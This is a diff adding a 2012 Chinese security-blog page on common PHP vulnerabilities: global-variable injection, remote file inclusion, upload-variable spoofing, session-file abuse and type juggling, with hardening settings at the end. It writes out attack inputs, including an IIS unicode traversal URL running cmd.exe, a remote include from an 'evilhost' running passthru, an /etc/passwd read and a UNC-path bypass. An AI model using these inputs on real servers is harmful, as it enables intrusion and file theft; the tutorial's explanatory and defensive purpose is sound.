@@ -1,0 +1,967 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>PHP程序的常见漏洞攻击分析 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="whytt" /><meta name="description" content="PHP程序的常见漏洞攻击分析。不是固若金汤，随着PHP的广泛运用，一些黑客们也在无时不想找PHP的麻烦，通过PHP程序漏洞进行攻击就是其中一种。在节，我们将从全局变量，远程文件，文件上载，库文件，Session文件，数据类型和容易出错的函数这几个方面分析了PHP的安全性。" />
+<meta name="keywords" content="PHP程序的常见漏洞攻击分析" />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/2750/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="PHP程序的常见漏洞攻击分析" />
+<meta property="og:description" content="PHP程序的常见漏洞攻击分析。不是固若金汤，随着PHP的广泛运用，一些黑客们也在无时不想找PHP的麻烦，通过PHP程序漏洞进行攻击就是其中一种。在节，我们将从全局变量，远程文件，文件上载，库文件，Session文件，数据类型和容易出错的函数这几个方面分析了PHP的安全性。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/2750/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2012-08-06T10:38:56&#43;08:00" />
+<meta property="article:modified_time" content="2012-08-06T11:00:09&#43;08:00" />
+
+<meta itemprop="name" content="PHP程序的常见漏洞攻击分析">
+<meta itemprop="description" content="PHP程序的常见漏洞攻击分析。不是固若金汤，随着PHP的广泛运用，一些黑客们也在无时不想找PHP的麻烦，通过PHP程序漏洞进行攻击就是其中一种。在节，我们将从全局变量，远程文件，文件上载，库文件，Session文件，数据类型和容易出错的函数这几个方面分析了PHP的安全性。"><meta itemprop="datePublished" content="2012-08-06T10:38:56&#43;08:00" />
+<meta itemprop="dateModified" content="2012-08-06T11:00:09&#43;08:00" />
+<meta itemprop="wordCount" content="6977">
+<meta itemprop="keywords" content="PHP,程序,分析,攻击,漏洞,cookie,HTTP,IE,IP,POS,Putty,Web,安全,本地,代码,服务,服务器,工具,函数,脚本,浏览器,命令,权限,数据,网站,文件,问题,系统,远程," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="PHP程序的常见漏洞攻击分析"/>
+<meta name="twitter:description" content="PHP程序的常见漏洞攻击分析。不是固若金汤，随着PHP的广泛运用，一些黑客们也在无时不想找PHP的麻烦，通过PHP程序漏洞进行攻击就是其中一种。在节，我们将从全局变量，远程文件，文件上载，库文件，Session文件，数据类型和容易出错的函数这几个方面分析了PHP的安全性。"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">PHP程序的常见漏洞攻击分析</h1>
+      
+      <div class="post-meta">
+        <time datetime="2012-08-06" class="post-time">
+          2012-08-06
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/php/"> PHP </a>
+            <a href="https://lcx.cc/categories/%E7%A8%8B%E5%BA%8F/"> 程序 </a>
+            <a href="https://lcx.cc/categories/%E5%88%86%E6%9E%90/"> 分析 </a>
+            <a href="https://lcx.cc/categories/%E6%94%BB%E5%87%BB/"> 攻击 </a>
+            <a href="https://lcx.cc/categories/%E6%BC%8F%E6%B4%9E/"> 漏洞 </a>
+            
+          </div>
+        <span class="more-meta"> 约 6977 字 </span>
+          <span class="more-meta"> 预计阅读 14 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<p style="text-indent:2em;">
+	不是固若金汤，随着PHP的广泛运用，一些黑客们也在无时不想找PHP的麻烦，通过PHP程序漏洞进行攻击就是其中一种。在节，我们将从全局变量，远程文件，文件上载，库文件，Session文件，数据类型和容易出错的函数这几个方面分析了PHP的安全性。
+</p>
+<p style="text-indent:2em;">
+	<b>如何通过全局变量进行攻击？</b> 
+</p>
+<p style="text-indent:2em;">
+	PHP中的变量不需要事先声明，它们会在第一次使用时自动创建，它们的类型根据上下文环境自动确定。从程序员的角度来看，这无疑是一种极其方便的处理方法。一旦一个变量被创建了，就可以在程序中的任何地方使用。这个特点导致的结果就是程序员很少初始化变量。
+</p>
+<p style="text-indent:2em;">
+	很显然，基于PHP的应用程序的主函数一般都是接受用户的输入（主要是表单变量，上载文件和Cookie等），然后对输入数据进行处理，然后把结果返回到客户端浏览器。为了使PHP代码访问用户的输入尽可能容易，实际上PHP是把这些输入数据看作全局变量来处理的。
+</p>
+<p style="text-indent:2em;">
+	例如：
+</p>
+<pre class="prettyprint lang-html">&lt;FORM METHOD="GET" ACTION="test.php"&gt;
+&lt;INPUT TYPE="TEXT" NAME="hello"&gt;
+&lt;INPUT TYPE="SUBMIT"&gt;
+&lt;/FORM&gt;</pre>
+<p style="text-indent:2em;">
+	这会显示一个文本框和提交按钮。当用户点击提交按钮时，"test.php"会处理用户的输入，当"test.php"运行时，"$hello"会包含用户在文本框输入的数据。从这里我们应该看出，攻击者可以按照自己的意愿创建任意的全局变量。如果攻击者不是通过表单输入来调用"test.php"，而是直接在浏览器地址栏输入http://server/test.php?hello=hi&amp;setup=no，那么，不止是"$hello"被创建，"$setup"也被创建了。
+</p>
+<p style="text-indent:2em;">
+	下面的用户认证代码暴露了PHP的全局变量所导致的安全问题：
+</p>
+<pre class="prettyprint lang-html">&lt;?php
+if ($pass == "hello")
+$auth = 1;
+...
+if ($auth == 1)
+echo "some important information";
+?&gt;</pre>
+<p style="text-indent:2em;">
+	上面的代码首先检查用户的密码是否为"hello"，如果匹配的话，设置"$auth"为"1"，即通过认证。之后如果"$suth"为"1"的话，就会显示一些重要信息。
+</p>
+<p style="text-indent:2em;">
+	这段代码假定"$auth"在没有设置值的时候是空的，但是攻击者可以创建任何全局变量并赋值，通过类似"http://server/test.php?auth=1"的方法，我们完全可以欺骗这段代码，使它相信我们是已经认证过的。
+</p>
+<p style="text-indent:2em;">
+	因此，为了提高PHP程序的安全性，我们不能相信任何没有明确定义的变量。如果程序中的变量很多的话，这可是一项非常艰巨的任务。
+</p>
+<p style="text-indent:2em;">
+	一种常用的保护方式就是检查数组HTTP_GET[]或POST_VARS[]中的变量，这依赖于我们的提交方式（GET或POST）。当PHP配置为打开"track_vars"选项的话（这是缺省值），用户提交的变量就可以在全局变量和上面提到的数组中获得。
+</p>
+<p style="text-indent:2em;">
+	但是值得说明的是，PHP有四个不同的数组变量用来处理用户的输入。HTTP_GET_VARS数组用来处理GET方式提交的变量，HTTP_POST_VARS数组用于处理POST方式提交的变量；HTTP_COOKIE_VARS数组用于处理作为cookie头提交的变量，而对于HTTP_POST_FILES数组（比较新的PHP才提供），则完全是用户用来提交变量的一种可选方式。用户的一个请求可以很容易的把变量存在这四个数组中，因此一个安全的PHP程序应该检查这四个数组。
+</p>
+<p style="text-indent:2em;">
+	<b>如何通过远程文件进行攻击？</b> 
+</p>
+<p style="text-indent:2em;">
+	PHP是一种具有丰富特性的语言，提供了大量的函数，使编程者很容易实现特定功能。但是从安全的角度来看，功能越多，要保证它的安全性就越难，远程文件就佐证这个问题的一个很好例子：
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+if (!($fd = fopen("$filename", "r"))
+echo("Could not open file: $filename&lt;BR&gt;\n");
+?&gt;</pre>
+<p style="text-indent:2em;">
+	上面的脚本试图打开文件"$filename"，如果失败就显示错误信息。很明显，如果我们能够指定"$filename"的话，就能利用这个脚本浏览系统中的任何文件。但是，这个脚本还存在一个不太明显的特性，那就是它可以从任何其它WEB或FTP站点读取文件。实际上，PHP的大多数文件处理函数对远程文件的处理是透明的。
+</p>
+<p style="text-indent:2em;">
+	例如：
+</p>
+<p style="text-indent:2em;">
+	如果指定"$filename"为 "http://target/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir"
+</p>
+<p style="text-indent:2em;">
+	则上面的代码实际上是利用主机target上的unicode漏洞，执行了dir命令。这使得支持远程文件的include()，require()，include_once()和require_once()在上下文环境中变得更有趣。这些函数主要功能是包含指定文件的内容，并且把它们按照PHP代码解释，主要是用在库文件上。
+</p>
+<p style="text-indent:2em;">
+	例如：
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+include($libdir . "/languages.php");
+?&gt;</pre>
+<p style="text-indent:2em;">
+	上例中"$libdir"一般是一个在执行代码前已经设置好的路径，如果攻击者能够使得"$libdir"没有被设置的话，那么他就可以改变这个路径。但是攻击者并不能做任何事情，因为他们只能在他们指定的路径中访问文件languages.php（perl中的"Poisonnull byte"攻击对PHP没有作用）。但是由于有了对远程文件的支持，攻击者就可以做任何事情。例如，攻击者可以在某台服务器上放一个文件languages.php，包含如下内容：
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+passthru("/bin/ls /etc");
+?&gt;</pre>
+<p style="text-indent:2em;">
+	然后把"$libdir"设置为"http://&lt;evilhost&gt;/"，这样我们就可以在目标主机上执行上面的攻击代码，"/etc"目录的内容将作为结果返回到客户的浏览器中。
+</p>
+<p style="text-indent:2em;">
+	需要注意的是，攻击代码是不会在自身所在的服务器（也就是evilhost）上执行执行自身PHP程序的，否则，攻击代码会攻击自身所在的服务器，而不是在目标服务器执行。
+</p>
+<p style="text-indent:2em;">
+	<b>如何通过文件上载进行攻击？</b> 
+</p>
+<p style="text-indent:2em;">
+	PHP自动支持基于RFC 1867的文件上载，我们看下面的例子：
+</p>
+<pre class="prettyprint lang-html">&lt;FORM METHOD="POST" ENCTYPE="multipart/form-data"&gt;
+&lt;INPUT TYPE="FILE" NAME="hello"&gt;
+&lt;INPUT TYPE="HIDDEN" NAME="MAX_FILE_SIZE" VALUE="10240"&gt;
+&lt;INPUT TYPE="SUBMIT"&gt;
+&lt;/FORM&gt;</pre>
+<p style="text-indent:2em;">
+	上面的代码让用户从本地机器选择一个文件，当点击提交后，文件就会被上载到服务器。这显然是很有用的功能，但是PHP的响应方式将使这项功能变得不安全。当PHP第一次接到这种请求，甚至在它开始解析被调用的PHP代码之前，它会先接受远程用户的文件，检查文件的长度是否超过"$MAX_FILE_SIZE variable"定义的值，如果通过这些测试的话，文件就会被存在本地的一个临时目录中。
+</p>
+<p style="text-indent:2em;">
+	因此，攻击者可以发送任意文件给运行PHP的主机，在PHP程序还没有决定是否接受文件上载时，文件已经被存在服务器上了。
+</p>
+<p style="text-indent:2em;">
+	让我们考虑一下处理文件上载的PHP程序，正如我们上面说的，文件被接收并且是存在服务器上（位置是在配置文件中指定的，一般是/tmp），扩展名一般是随机的，类似"phpxXuoXG"的形式。PHP程序需要上载文件的信息以便处理它，这可以通过两种方式，一种方式是在PHP3中已经使用的，另一种是在我们对以前的方法提出安全公告后引入的。
+</p>
+<p style="text-indent:2em;">
+	大多数PHP程序还是使用老的方式来处理上载文件。PHP设置了四个全局变量来描述上载文件，比如说上面的例子：
+</p>
+<pre class="prettyprint lang-php">$hello = Filename on local machine (e.g "/tmp/phpxXuoXG")
+$hello_size = Size in bytes of file (e.g 1024)
+$hello_name = The original name of the file on the remote system (e.g"c:\\temp\\hello.txt")
+$hello_type = Mime type of uploaded file (e.g "text/plain")</pre>
+<p style="text-indent:2em;">
+	然后，PHP程序开始处理根据"$hello"指定的文件。问题在于"$hello"不一定是一个PHP设置的变量，任何远程用户都可以指定它。如果我们使用下面的方式：
+</p>
+<pre class="prettyprint lang-html">http://vulnhost/vuln.php?hello=/etc/passwd&amp;hello_size=10240&amp;hello_type=text/plain&amp;hello_name=hello.txt</pre>
+<p style="text-indent:2em;">
+	就导致了下面的PHP全局变量（当然POST方式也可以（甚至是Cookie））：
+</p>
+<pre class="prettyprint lang-php">$hello = "/etc/passwd"
+$hello_size = 10240
+$hello_type = "text/plain"
+$hello_name = "hello.txt"</pre>
+<p style="text-indent:2em;">
+	上面的表单数据正好满足了PHP程序所期望的变量，但是这时PHP程序不再处理本应在上载者本机上的上载文件，而是处理服务器上"/etc/passwd"（通常会导致内容暴露）文件。这种攻击可以用于暴露任何敏感文件的内容。
+</p>
+<p style="text-indent:2em;">
+	新版本的PHP使用HTTP_POST_FILES[]来决定上载文件，同时也提供了很多函数来解决这个问题，例如有一个函数用来判断某个文件是不是实际上载的文件。但是实际上肯定有很多PHP程序仍然使用旧的方法，所以也很容易受到这种攻击。
+</p>
+<p style="text-indent:2em;">
+	作为文件上载的攻击方法的一个变种，我们看一下下面的一段代码：
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+if (file_exists($theme)) // Checks the file exists on the local system (noremote files)
+include("$theme");
+?&gt;</pre>
+<p style="text-indent:2em;">
+	如果攻击者可以控制"$theme"的话，很显然它可以利用"$theme"来读取远程系统上的任何文件。攻击者的最终目标是在远程服务器上执行任意指令，但是他无法使用远程文件，因此，他必须得在远程服务器上创建一个PHP文件。这乍看起来好象是不可能的，但是文件上载帮了我们这个忙，如果攻击者先在本地机器上创建一个包含PHP代码的文件，然后创建一个包含名为"theme"的文件域的表单，最后用这个表单通过文件上载把创建的包含PHP代码的文件提交给上面的代码，PHP就会把攻击者提交的文件保存起来，并把"$theme"的值设置为攻击者提交的文件，这样file_exists()函数会检查通过，攻击者的代码也将执行。
+</p>
+<p style="text-indent:2em;">
+	获得执行任意指令的能力之后，攻击者显然想提升权限或者是扩大战果，而这又需要一些服务器上没有的工具集，而文件上载又一次帮了攻击者的忙。攻击者可以使用文件上载功能上载工具，把她们存在服务器上，然后利用他们执行指令的能力，使用chmod()改变文件的权限，然后执行。例如：攻击者可以绕过防火墙或IDS上载一个本地root攻击程序，然后执行，这样就获得了root权限。
+</p>
+<p style="text-indent:2em;">
+	<b>如何通过库文件进行攻击？</b> 
+</p>
+<p style="text-indent:2em;">
+	正如我们前面讨论的那样，include()和require()主要是为了支持代码库，因为我们一般是把一些经常使用的函数放到一个独立的文件中，这个独立的文件就是代码库，当需要使用其中的函数时，我们只要把这个代码库包含到当前的文件中就可以了。
+</p>
+<p style="text-indent:2em;">
+	最初，人们开发和发布PHP程序的时候，为了区别代码库和主程序代码，一般是为代码库文件设置一个".inc"的扩展名，但是他们很快发现这是一个错误，因为这样的文件无法被PHP解释器正确解析为PHP代码。如果我们直接请求服务器上的这种文件时，我们就会得到该文件的源代码，这是因为当把PHP作为Apache的模块使用时，PHP解释器是根据文件的扩展名来决定是否解析为PHP代码的。扩展名是站点管理员指定的，一般是".php"， ".php3"和".php4"。如果重要的配置数据被包含在没有合适的扩展名的PHP文件中，那么远程攻击者很容易得到这些信息。
+</p>
+<p style="text-indent:2em;">
+	最简单的解决方法就是：给每个文件都指定一个PHP文件的扩展名，这样可以很好的防止泄露源代码的问题，但是又产生了新的问题，通过请求这个文件，攻击者可能使本该在上下文环境中运行的代码独立运行，这可能导致前面讨论的全部攻击。
+</p>
+<p style="text-indent:2em;">
+	下面是一个很明显的例子：
+</p>
+<pre class="prettyprint lang-php">In main.php:
+
+&lt;?php
+$libDir = "/libdir";
+$langDir = "$libdir/languages";
+...
+include("$libdir/loadlanguage.php":
+?&gt;
+In libdir/loadlanguage.php:
+&lt;?php
+...
+include("$langDir/$userLang");
+?&gt;</pre>
+<p style="text-indent:2em;">
+	当"libdir/loadlanguage.php"被"main.php"调用时是相当安全的，但是因为"libdir/loadlanguage"具有".php"的扩展名，因此远程攻击者可以直接请求这个文件，并且可以任意指定"$langDir"和"$userLang"的值。
+</p>
+<p style="text-indent:2em;">
+	<b>如何通过Session文件进行攻击？</b> 
+</p>
+<p style="text-indent:2em;">
+	PHP 4或更新的版本提供了对sessions的支持，它的主要作用是在PHP程序中保存页与页之间的状态信息。例如，当一个用户登陆进入网站，他登陆了的这个事实以及谁登陆进入这个网站的相关信息都将被保存在session中，当他在网站中到处浏览时，所有的PHP代码都可以获得这些状态信息。
+</p>
+<p style="text-indent:2em;">
+	事实上，当一个session启动时（实际上是在配置文件中设置为在第一次请求时自动启动），就会生成一个随机的"session id"，如果远程浏览器总是在发送请求时提交这个"session id"的话，session就会一直保持。这通过Cookie很容易实现，也可以通过在每页提交一个表单变量（包含"session id"）来实现。PHP程序可以用session注册一个特殊的变量，它的值会在每个PHP脚本结束后存在session文件中，也会在每个PHP脚本开始前加载到变量中。下面是一个简单的例子：
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+session_destroy(); // Kill any data currently in the session
+$session_auth = "shaun";
+session_register("session_auth"); // Register $session_auth as a session variable
+?&gt;</pre>
+<p style="text-indent:2em;">
+	新版本的PHP都会自动把"$session_auth"的值设置为"shaun"，如果它们被修改的话，以后的脚本都会自动接受修改后的值，这对无状态的Web来说的确是种很不错的工具，但是我们也应该小心。
+</p>
+<p style="text-indent:2em;">
+	一个很明显的问题就是确保变量的确来自session，例如，给定上面的代码，如果后续的脚本是下面这样的话：
+</p>
+<pre class="prettyprint lang-php">&lt;?php
+if (!empty($session_auth))
+// Grant access to site here
+?&gt;</pre>
+<p style="text-indent:2em;">
+	上面的代码假定如果"$session_auth"被赋值的话，就是从session，而不是从用户输入来赋值的，如果攻击者通过表单输入来赋值的话，他就可以获得对站点的访问权。注意攻击者必须在session注册该变量之前使用这种攻击方法，一旦变量被放进了session，就会覆盖任何表单输入。
+</p>
+<p style="text-indent:2em;">
+	Session数据一般是保存在文件中（位置是可配置的，一般是"/tmp"），文件名一般是类似"sess_&lt;session id&gt;"的形式，这个文件包含变量名称，变量类型，变量值和一些其它的数据。在多主机系统中，因为文件是以运行Web服务器的用户身份（一般是nobody）保存的，因此恶意的站点拥有者就可以通过创建一个session文件来获得对其它站点的访问，甚至可以检查session文件中的敏感信息。
+</p>
+<p style="text-indent:2em;">
+	Session机制也为攻击者把自己的输入保存在远程系统的文件中提供了另一个方便。对于上面的例子来说，攻击者需要在远程系统放置一个包含PHP代码的文件，如果不能利用文件上载做到的话，他通常会利用session为一个变量按照自己的意愿赋一个值，然后猜测session文件的位置，而他知道文件名是"php&lt;session id&gt;"，所以只需猜测目录，而目录一般就是"/tmp"。
+</p>
+<p style="text-indent:2em;">
+	另外，攻击者可以任意指定"session id"（例如"hello"），然后用这个"session id"创建一个session文件（例如"/tmp/sess_hello"），但是"session id"只能是字母和数字组合。
+</p>
+<p style="text-indent:2em;">
+	<b>如何通过数据类型进行攻击？</b> 
+</p>
+<p style="text-indent:2em;">
+	PHP具有比较松散的数据类型，变量的类型依赖于它们所处的上下文环境。例如："$hello"开始是字符串变量，值为""，但是在求值时，就变成了整形变量"0"，这有时可能会导致一些意想不到的结果。如果"$hello"的值为"000"还是为"0"是不同的，empty()返回的结果也不会为真。
+</p>
+<p style="text-indent:2em;">
+	PHP中的数组是关联数组，也就是说，数组的索引是字符串型的。这意味着"$hello["000"]"和"$hello[0]"也是不同的。
+</p>
+<p style="text-indent:2em;">
+	开发程序的时候应该仔细地考虑上面的问题，例如，我们不应该在一个地方测试某个变量是否为"0"，而在另外的地方使用empty()来验证。
+</p>
+<p style="text-indent:2em;">
+	如何通过容易出错的函数进行攻击？下面是一份比较详细的容易出错的函数列表：
+</p>
+<pre class="prettyprint lang-php">&lt;PHP代码执行&gt;
+require()：读取指定文件的内容并且作为PHP代码解释
+include()：同上
+eval()：把给定的字符串作为PHP代码执行
+preg_replace()：当与"/e"开关一起使用时，替换字符串将被解释为PHP代码
+
+&lt;命令执行&gt;
+exec()：执行指定的命令，返回执行结果的最后一行
+passthru()：执行指定命令，返回所有结果到客户浏览器
+``：执行指定命令，返回所有结果到一个数组
+system()：同passthru()，但是不处理二进制数据
+popen()：执行指定的命令，把输入或输出连接到PHP文件描述符
+
+&lt;文件泄露&gt;
+fopen()：打开文件，并对应一个PHP文件描述符
+readfile()：读取文件的内容，然后输出到客户浏览器
+file()：把整个文件内容读到一个数组中</pre>
+<p style="text-indent:2em;">
+	<b>如何增强PHP的安全性?</b> 
+</p>
+<p style="text-indent:2em;">
+	我们在上面介绍的所有攻击对于缺省安装的PHP4都可以很好的实现，但是PHP的配置非常灵活，通过配置一些PHP选项，我们完全可能抵抗其中的一些攻击。下面我们按照实现的难度对一些配置进行了分类：
+</p>
+<pre class="prettyprint lang-php">*　　　　 低难度
+**　　　　中低难度
+***　　　 中高难度
+****　　　高难度</pre>
+<p style="text-indent:2em;">
+	如果你使用了PHP提供的所有选项的话，那么你的PHP将是很安全的，即使是第三方的代码也是如此，因为其中很多功能已经不能使用。
+</p>
+<p style="text-indent:2em;">
+	**** 设置"register_globals"为"off"
+</p>
+<p style="text-indent:2em;">
+	这个选项会禁止PHP为用户输入创建全局变量，也就是说，如果用户提交表单变量"hello"，PHP不会创建"$ hello"，而只会创建"HTTP_GET/POST_VARS['hello']"。这是PHP中一个极其重要的选项，关闭这个选项，会给编程带来很大的不便。
+</p>
+<p style="text-indent:2em;">
+	*** 设置"safe_mode"为"on"
+</p>
+<p style="text-indent:2em;">
+	打开这个选项，会增加如下限制：
+</p>
+<p style="text-indent:2em;">
+	1． 限制哪个命令可以被执行
+</p>
+<p style="text-indent:2em;">
+	2． 限制哪个函数可以被使用
+</p>
+<p style="text-indent:2em;">
+	3． 基于脚本所有权和目标文件所有权的文件访问限制
+</p>
+<p style="text-indent:2em;">
+	4． 禁止文件上载功能
+</p>
+<p style="text-indent:2em;">
+	这对于ISP来说是一个"伟大"的选项，同时它也能极大地改进PHP的安全性。
+</p>
+<p style="text-indent:2em;">
+	** 设置"open_basedir"
+</p>
+<p style="text-indent:2em;">
+	这个选项可以禁止指定目录之外的文件操作，有效地消除了本地文件或者是远程文件被include()的攻击，但是仍需要注意文件上载和session文件的攻击。
+</p>
+<p style="text-indent:2em;">
+	** 设置"display_errors"为"off"，设置"log_errors"为"on"
+</p>
+<p style="text-indent:2em;">
+	这个选项禁止把错误信息显示在网页中，而是记录到日志文件中，这可以有效的抵制攻击者对目标脚本中函数的探测。
+</p>
+<p style="text-indent:2em;">
+	* 设置"allow_url_fopen"为"off"
+</p>
+<p style="text-indent:2em;">
+	这个选项可以禁止远程文件功能。
+</p>
+<pre class="prettyprint lang-html">//这里allow_url_fopen 注意下,在jnc blog上看到,可以用
+&lt;?php
+include('\\myip\test.php');
+?&gt;
+&lt;?php
+include('//myip\test.php');
+?&gt;</pre>
+<p style="text-indent:2em;">
+	来饶过?
+</p>
+<p style="text-indent:2em;">
+	转自：<a href="http://computer.mblogger.cn/whytt/posts/63971.aspx" target="_blank">http://computer.mblogger.cn/whytt/posts/63971.aspx</a> 
+</p>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">whytt</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2012-08-06
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/php/">PHP</a>
+          <a href="https://lcx.cc/tags/%E7%A8%8B%E5%BA%8F/">程序</a>
+          <a href="https://lcx.cc/tags/%E5%88%86%E6%9E%90/">分析</a>
+          <a href="https://lcx.cc/tags/%E6%94%BB%E5%87%BB/">攻击</a>
+          <a href="https://lcx.cc/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a>
+          <a href="https://lcx.cc/tags/cookie/">cookie</a>
+          <a href="https://lcx.cc/tags/http/">HTTP</a>
+          <a href="https://lcx.cc/tags/ie/">IE</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/pos/">POS</a>
+          <a href="https://lcx.cc/tags/putty/">Putty</a>
+          <a href="https://lcx.cc/tags/web/">Web</a>
+          <a href="https://lcx.cc/tags/%E5%AE%89%E5%85%A8/">安全</a>
